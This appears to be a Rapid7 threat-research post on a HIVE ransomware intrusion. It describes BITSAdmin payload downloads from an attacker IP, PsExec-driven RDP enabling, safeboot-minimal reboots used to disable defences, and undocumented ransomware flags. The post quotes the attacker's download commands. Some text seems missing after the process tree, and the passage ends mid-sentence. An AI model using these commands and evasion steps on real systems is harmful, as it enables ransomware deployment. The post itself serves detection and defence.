[&amp;_ul]:text-gray-charcoal [&amp;_ol]:text-gray-charcoal [&amp;_blockquote]:text-black-rich prose max-w-none"><h3>How malicious actors evade detection and disable defenses for more destructive HIVE Ransomware attacks.</h3><p>Rapid7 routinely conducts research into the wide range of techniques that threat actors use to conduct malicious activity. One objective of this research is to discover new techniques being used in the wild, so we can develop new detection and response capabilities.</p><p>Recently, Rapid7 observed a malicious actor performing several known techniques for distributing <a href="/fundamentals/what-is-ransomware/" target="_blank" rel="noopener">ransomware</a> across many systems within a victim’s environment. In addition to those techniques, the actor employed a number of previously unseen techniques designed to to drop the defenses of the victim, inhibit monitoring, disable networking and allow time for the ransomware to finish encrypting files. These extra steps would make it extremely difficult, if not impossible, for a victim to effectively use their security tools to defend endpoints after a certain point in the attack. </p><p>Rapid7 has updated existing and added new detections to InsightIDR to defend against these techniques. In this article, we’ll explore the techniques employed by the threat actor, why they’re so effective, and how we’ve updated InsightIDR to protect against them.</p><h3>What approach did the malicious actor take to prepare the victim&#x27;s environment?</h3><p>Initially using <a href="https://www.cobaltstrike.com/" target="_blank" rel="noopener">Cobalt Strike</a>, the malicious actor retrieved system administration tools and malicious payloads by using the Background Intelligent Transfer Service (<a href="https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool" target="_blank" rel="noopener">BITSAdmin</a>).</p><pre>&quot;C:\Windows\system32\bitsadmin.exe&quot; /transfer debjob /download /priority normal http://79.137.206.47/PsExec.exe C:\Users\Public\PsExec.exe<br/><br/>bitsadmin  /transfer debjob /download /priority normal http://79.137.206.47/int.exe C:\Windows\int.exe<br/></pre><p>The malicious actor then began using the remote process execution tool <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener">PSExec</a> to execute batch files (rdp.bat) that would cause registry changes to <a href="https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-localsessionmanager-fdenytsconnections" target="_blank" rel="noopener">enable Remote Desktop</a> sessions (RDP) using reg.exe. This enabled the malicious actor to laterally move throughout the victim’s environment using the graphical user interface.</p><pre>PSEXESVC.exe: C:\Windows\PSEXESVC.exe└──cmd.exe: C:\Windows\system32\cmd.exe /c &quot;&quot;rdp.bat&quot; In this case, any system that was booting and connected to the environment would receive the configuration changes, encrypted archive containing the ransomware, a decompression utility to extract the ransomware, configuration changes and the order to reboot and execute. This can be especially effective if timed with deployments of patches that require a reboot, done at the beginning of the day or even remotely using <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-computer?view=powershell-7.3" target="_blank" rel="noopener">Powershell&#x27;s Stop-Computer cmdlet</a>.</p><p>Storing the ransomware within a 7zip encrypted archive  (int.7z) with a password even as simple as (123) makes the task of identifying the ransomware on disk or transmitted across the network nearly impossible. This makes retrieval and staging of the malicious actors payload very difficult to spot by security software or devices (Antivirus, Web Filtering, IDS/IPS and more). In this case, the malicious actor has taken care to only put the encrypted copy on the disk of a victim’s system and not execute it until they have fully dropped the defenses on the endpoint.</p><p>Reconfiguring the default boot behavior to safeboot minimal and then executing a reboot unloads all but the bare minimum for the Windows operating system. With no additional services, software or drivers loaded the system is at its most vulnerable. With no active defenses (Antivirus or Endpoint Protection) the system comes up and tries to start its defined shell which has been swapped to a batch script (file2.bat) by the malicious actor. </p><p>It should be noted that in this state, <strong>there is no method of remotely interacting with the system as no network drivers are loaded. In order to respond and halt the ransomware, each host must be physically visited for shutdown. </strong>Manually priming the host in this way is more effective than the existing capabilities of the HIVE ransomware which stops specific defensive services (Windows Defender, etc) and kills specific processes prior to encrypting the contents of the drive.</p><p> All systems in this state are left automatically logged in as an administrator, which gives anyone who has physical access complete control. Lastly, the system will continue to boot into safeboot minimal mode by default (again, no networking) until each system is set back to its original state with a command such as below. Bringing the host back online in this state will still continue to execute the malware when logged into, which will also enable the default network spreading behavior.</p><p>bcdedit /deletevalue {default} safeboot</p><p>Lastly, the malicious actor also manually executed the payload a few times on systems that had not been put into safeboot minimal and rebooted. Systems they executed with only the -u flag actively searched out network shares they had access to and encrypted their contents. This ensures that only the intended hosts do network share encryption and all those that were rebooted into safeboot minimal do not flood the network simultaneously encrypting all files. It also means that the contents of network file shares that are not Windows based (various NAS devices, Linux hosts using Samba) will be encrypted even if the payload is not actually deployed on that specific host. This approach would be extremely destructive to both corporate environments and home users with network attached storage systems for backups. Rapid7 notes that <a href="https://threatlocker.com/" target="_blank" rel="noopener">ThreatLocker</a> have reported on similar activity in their knowledge base article entitled <a href="https://threatlocker.kb.help/preventing-bcdedit-from-being-weaponized/" target="_blank" rel="noopener">Preventing BCDEdit From Being Weaponized</a>.</p><h3>Malware analysis of HIVE sample</h3><p>Rapid7 observed that the HIVE payload would not execute unless a flag of -u was passed. During analysis it was discovered that passing -u asdf:asdf would result in the Login and Password (colon-delimited) provided to the victim to authenticate to the site behind the onion link on the TOR network:</p><img src="https://lh3.googleusercontent.com/1dEgM5XEM9gTYqp3b0XEbMPtSGyJ67An4XaUi8lYfnZGbA81EmTEeP40esolpjAJ3zuc20FNAM8rtVO8ghUMtu41Nko1Sp1KcHr1rvoRRWKNgu7jXftvancKuioZri3Xs4oFVBvBO3UpNZ7FrUv4b9IOifmmoqoJkn_goxu3gicgc-dvG1A1sP9fAcjzPg" width="auto" style="width:auto;height:auto"/><p><br/>This, and other behaviors were previously reported on by Microsoft&#x27;s article <a href="https://www.microsoft.com/en-us/security/blog/2022/07/05/hive-ransomware-gets-upgrades-in-rust/" target="_blank" rel="noopener">Hive Ransomware Gets Upgrades in Rust</a> and also by Sophos in their <a href="https://github.com/sophoslabs/IoCs/blob/master/Ransomware_Hive%20-%20triple%20ransomware%20attack.csv" target="_blank" rel="noopener">Github Repository of IoC&#x27;s</a> mentioned in their article <a href="https://news.sophos.com/en-us/2022/08/10/lockbit-hive-and-blackcat-attack-automotive-supplier-in-triple-ransomware-attack/" target="_blank" rel="noopener">Lockbit, Hive, and BlackCat attack automotive supplier in triple ransomware attack</a>. There have been some flags that are noted to exist, but their features are not documented. Rapid7 has analyzed the behaviors of these flags, documented them in addition to discovering two new flags (-timer, -low-key) in the HIVE ransomware samples.</p><p>The new flags -t, -timer, --timer effectively cause the malware to wait the specified number of seconds before going on to perform its actions. The other new flags -low-key, --low-key will cause the ransomware to focus on only its encryption of data and not perform pre-encryption tasks, including deleting shadow copies (malicious use of vssadmin.exe, wmic.exe), deleting backup catalogs (malicious use of wbadmin.exe), and disabling Windows Recovery Mode (malicious use of bcdedit.exe). These features give the malicious actor more control over how/when the payload is executed and skirt common methods of command line and parent/child process related detection for most ransomware families. </p><p>Fundamentally, the sample’s respective flags distill down into encryption operations of local, mount and discovery.  The local module utilizes the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew" target="_blank" rel="noopener">LookupPrivilegeValueW</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges" target="_blank" rel="noopener">AdjustTokenPrivileges</a> that Windows API calls on its own process via <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess" target="_blank" rel="noopener">GetCurrentProcess</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken" target="_blank" rel="noopener">OpenProcessToken</a> to obtain SeDebugPrivilege privileges.  This is presumably crucial for <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess#remarks:~:text=To%20open%20a%20handle%20to%20another%20local%20process%20and%20obtain%20full%20access%20rights%2C%20you%20must%20enable%20the%20SeDebugPrivilege%20privilege.%20For%20more%20information%2C%20see%20Changing%20Privileges%20in%20a%20Token." target="_blank" rel="noopener">OpenProcess</a> -&gt;
